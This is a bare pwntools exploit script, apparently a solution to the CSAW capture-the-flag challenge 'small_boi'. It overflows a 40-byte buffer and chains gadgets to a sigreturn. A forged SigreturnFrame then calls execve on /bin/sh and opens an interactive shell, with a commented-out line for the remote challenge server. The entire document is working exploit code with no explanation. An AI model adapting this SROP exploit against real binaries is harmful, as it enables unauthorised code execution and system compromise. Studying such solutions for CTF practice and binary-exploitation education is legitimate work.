from pwn import *
context.clear(arch="amd64")
paylaod = ""
paylaod += "A"*40
paylaod += p64(0x000000000040018a)
paylaod += p64(0xf)
paylaod += p64(0x0000000000400185)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = 0x4001ca
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x0000000000601000
frame.rip = 0x0000000000400185
paylaod += str(frame)*10

p = process("./small_boi")
#p = remote("pwn.chal.csaw.io",1002)
#pause()
p.sendline(paylaod)
p.interactive()
